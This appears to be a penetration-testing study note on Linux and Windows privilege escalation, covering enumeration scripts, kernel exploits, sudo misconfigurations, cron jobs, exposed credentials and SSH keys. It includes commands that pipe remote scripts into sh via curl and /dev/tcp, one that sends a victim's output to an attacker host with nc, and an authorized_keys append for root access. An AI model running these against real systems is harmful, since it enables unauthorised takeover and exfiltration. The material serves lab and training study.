# Privilege Escalation

Our initial access to a target server is usually in the context of a low-privileged user, which would not give full access of a box.

So internal vulnerability is needed for escalating our privileges to root on Linux or administrator/SYSTEM user on Windows.

## PrivEsc checklists

Once we have initial access to the a box, we want to thoroughly enumerate over the box to find PrivEsc vulnerabilities.

There's checklists
[Linux and Windows](https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist)
[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

## Enumeration scripts

There are scripts that automatically enumerates the web server for PrivEsc

Linux:
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker)

Windows:
- [Seatbelt](https://github.com/GhostPack/Seatbelt)
- [JAWS](https://github.com/411Hall/JAWS)

[Suite for PrivEsc scripts](https://github.com/carlospolop/PEASS-ng)

Sometimes scripts can trigger anti-viruses and stop scripts from running, so sometimes manual enumeration is better.

## Example

To run LinPeas
```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

```bash
# Local network
sudo python3 -m http.server 80 #Host
curl 10.10.10.10/linpeas.sh | sh #Victim

# Without curl
sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
cat < /dev/tcp/10.10.10.10/80 | sh #Victim

# Excute from memory and send output back to the host
nc -lvnp 9002 | tee linpeas.out #Host
curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim
```
```bash
# Output to file
./linpeas.sh -a > /dev/shm/linpeas.txt #Victim
less -r /dev/shm/linpeas.txt #Read with colors
```
```bash
# Use a linpeas binary
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_linux_amd64
chmod +x linpeas_linux_amd64
./linpeas_linux_amd64
```

## Kernel exploits

With old OS, we can look for kernel exploits. In the hackthebox example they ran LinPeas on server which had Linux version `3.9.0-73-generic` which has a `CVE-2016-5195` known as DirtyCow, which can be downloaded and run to gain root access.

All these should be run in caution as it can provide instabilities to the exploited system

## Vulnerable software

In Linux we can run `dpkg -l` or windows go to `C:\Program Files` to check for software, and the main goal is to find vulnerable, outdated. 

## User Privileges

When we get into a system we need to check for the privileges we have.

### sudo

It allows users to execute commands as root. We can check what sudo privileges we have with `sudo -l`
```bash
└──╼ $sudo -l
[sudo] password for k3yman: 
Matching Defaults entries for k3yman on parrot:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    timestamp_timeout=30

User k3yman may run the following commands on parrot:
    (ALL : ALL) ALL
    (ALL) ALL
```

As we can see user has complete access to root, so we can just casually `sudo su -` to switch to root. Though password is required when running commands as `sudo`.  

Sometimes some commands can be run without password
`(user : user) NOPASSWD: /bin/echo`
The code above shows that we can run echo without password.
Once we find programs we can run with sudo we can look ways to exploit it.
[GTFOBins](https://gtfobins.github.io/) contains list of commands and how they can be exploited through sudo. Basically if we have root access to any of the applications listed in `GTFOBins` we can gain root access.
[Windows](https://lolbas-project.github.io/#)

## Scheduled tasks

There are ways to make script run at specific interval to carry out a task.

On windows it's called Scheduled Tasks on Linux Cron Jobs

On Linux if we have write permissions to
1. /etc/crontab
2. /etc/cron.d
3. /var/spool/cron/crontabs/root

## Exposed Credentials

Next, we can look for files we can read and see if they contain any exposed credentials. This is very common with configuration files, log files, and user history files (bash_history in Linux and PSReadLine in Windows). The enumeration scripts we discussed at the beginning usually look for potential passwords in files and provide them to us.

If we find any passwords we should check fr password reuse

## SSH Keys

If we have read access over .ssh directory for a specific user, we may read their private ssh keys found in `\home\user\.ssh\id_rsa` or `\root\.ssh\id_rsa` and use them to log in to the server. Then we can copy it and log in into the server.

If ssh keys have lax permissions, ssh server prevents from using those keys. So `chmod 600 private_key`

If we have write access to `./ssh` directory we can add our generated public key to gain access to the server. We have to gain shell as that user to be able to add keys as SSH config will not accepts keys written by other users.

Command to append to authorized keys
```bash
echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
```

Now we can login.